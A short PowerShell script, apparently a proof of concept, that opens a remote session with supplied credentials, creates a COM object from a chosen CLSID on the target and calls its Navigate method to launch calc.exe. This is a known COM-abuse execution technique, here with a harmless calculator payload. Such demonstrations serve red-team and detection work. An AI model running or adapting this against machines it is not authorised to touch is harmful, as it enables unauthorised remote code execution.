param(
    [Parameter(Mandatory=$True,Position=1)]
    [String]$computername,

    [Parameter(Mandatory=$True,Position=2)]
    [String]$user,

    [Parameter(Mandatory=$True,Position=3)]
    [String]$clsid
)

$session = New-PSSession -ComputerName $computername -Credential $computername\$user

Invoke-Command -Session $session -ScriptBlock {
    $COM = [activator]::CreateInstance([type]::GetTypeFromCLSID($Using:clsid, "localhost"))
    #Start-Sleep -Milliseconds 250
    $COM.Application.Application.Navigate("C:\Windows\System32\calc.exe")
    #Stop-Process -Name "iexplore.exe"
}